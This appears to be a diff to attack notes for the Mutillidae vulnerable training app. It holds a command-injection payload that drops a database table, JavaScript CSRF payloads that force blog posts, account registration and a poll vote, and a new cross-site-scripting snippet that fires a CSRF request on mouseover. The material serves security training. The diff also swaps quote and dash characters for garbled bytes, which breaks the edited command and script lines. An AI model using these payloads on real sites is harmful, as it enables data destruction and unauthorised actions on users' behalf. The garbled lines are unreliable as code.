@@ -514,7 +514,7 @@ Cover Tracks: Clear logs
 
 Convering Tracks: Database Expolits via Command Injection
 
-	Linux (Samurai): 192.168.1.1; mysql –user=root –password=samurai –execute=”DROP TABLE accounts” owasp10
+	Linux (Samurai): 192.168.1.1; mysql ï¿½user=root ï¿½password=samurai ï¿½execute=ï¿½DROP TABLE accountsï¿½ owasp10
 
 Recon: Explore Database Files
 
@@ -966,8 +966,8 @@ Force someone to add a blog without consent (Credit: Udit Bajaj):
 		elem.value = "this is an auto message!";
 		var hiddenField = document.createElement("input");
 		hiddenField.setAttribute("type", "hidden");
-		hiddenField.setAttribute("name", “add-to-your-blog-php-submit-button”);
-		hiddenField.setAttribute("value", “Save Blog Entry”);
+		hiddenField.setAttribute("name", ï¿½add-to-your-blog-php-submit-buttonï¿½);
+		hiddenField.setAttribute("value", ï¿½Save Blog Entryï¿½);
 		curform.appendChild(hiddenField);
 		curform.submit();
 	}
@@ -980,6 +980,53 @@ Force someone to register without their consent:
 Force someone to register without their consent:
 Here is the same example using XHR rather than the "onmouseover" event:
 <script> var lXMLHTTP; try{ var lData = "username=fred&password=pass&confirm_password=pass&my_signature=signature1&register-php-submit-button=Create+Account"; var lAction = "/index.php?page=register.php"; var lMethod = "POST"; try { lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); }catch (e) { try { lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); }catch (e) { try { lXMLHTTP = new XMLHttpRequest(); }catch (e) { alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } } }//end try lXMLHTTP.onreadystatechange = function(){ if(lXMLHTTP.readyState == 4){ alert("CSRF Complete");//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } } ///////////////////////////// //UNCOMMENT FOR GET REQUESTS ///////////////////////////// //xmlhttp.open(lMethod, lAction, true); //lData=""; ///////////////////////////// ///////////////////////////// //UNCOMMENT FOR POST REQUESTS ///////////////////////////// lXMLHTTP.open(lMethod, lAction, true); lXMLHTTP.setRequestHeader("Method", "POST " + lAction + " HTTP/1.1"); lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); lXMLHTTP.send(lData); }catch(e){ alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } </script> 
+
+------------------------------------------------------------------------------------
+Sample to perform cross-site script on the Add to Your Blog that will 
+perform CSRF on the User Poll
+------------------------------------------------------------------------------------
+<script>
+function sendcsrf(){
+	var lForm = document.createElement("FORM");
+	lForm.action="http://mutillidae/index.php";
+	lForm.method = "GET";
+	lForm.enctype="application/x-www-form-urlencoded";
+	document.body.appendChild(lForm);
+
+	var lPage = document.createElement("INPUT");
+	lPage.setAttribute("name", "page");
+	lPage.setAttribute("type", "hidden");
+	lPage.setAttribute("value", "user-poll.php");
+	lForm.appendChild(lPage);
+
+	var lCSRFToken = document.createElement("INPUT");
+	lCSRFToken.setAttribute("name", "csrf-token");
+	lCSRFToken.setAttribute("type", "hidden");
+	lCSRFToken.setAttribute("value", "");
+	lForm.appendChild(lCSRFToken);
+
+	var lChoice = document.createElement("INPUT");
+	lChoice.setAttribute("name", "choice");
+	lChoice.setAttribute("type", "hidden");
+	lChoice.setAttribute("value", "nmap");
+	lForm.appendChild(lChoice);
+
+	var lInitials = document.createElement("INPUT");
+	lInitials.setAttribute("name", "initials");
+	lInitials.setAttribute("type", "hidden");
+	lInitials.setAttribute("value", "JD");
+	lForm.appendChild(lInitials);
+
+	var lButton = document.createElement("INPUT");
+	lButton.setAttribute("name", "user-poll-php-submit-button");
+	lButton.setAttribute("type", "hidden");
+	lButton.setAttribute("value", "Submit Vote");
+	lForm.appendChild(lButton);
+
+	lForm.submit();
+}
+</script>
+<span onmouseover="sendcsrf();">Vote for nmap. I know you will.</span>
 
 -------------------------
 Security Misconfiguration
